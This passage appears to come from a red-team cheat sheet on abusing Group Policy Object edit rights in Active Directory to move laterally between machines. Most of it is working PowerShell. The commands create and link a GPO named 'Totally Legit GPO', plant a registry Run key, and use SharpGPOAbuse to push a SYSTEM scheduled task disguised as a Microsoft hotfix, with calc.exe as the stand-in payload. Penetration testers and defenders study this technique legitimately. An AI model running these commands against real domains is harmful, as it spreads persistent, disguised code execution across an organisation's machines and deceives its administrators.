If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to [‘AD Enumeration With PowerView’](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#ad-enumeration-with-powerview)), we can abuse these privileges to move laterally towards other machines.

As an example, we can use the legitimate [Remote System Administration Tools](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) (RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.

```powershell
# Create a new GPO and link it to the target server
New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com'

# Link an existing GPO to another target server
New-GPLink -Target 'OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com' -Name 'Totally Legit GPO'

# Deploy a registry runkey via the GPO
Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.exe' -Type ExpandString
```

We can also use [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1-2 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.

```powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Microsoft LEGITIMATE Hotfix" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c start calc.exe" --GPOName "Totally Legit GPO"
```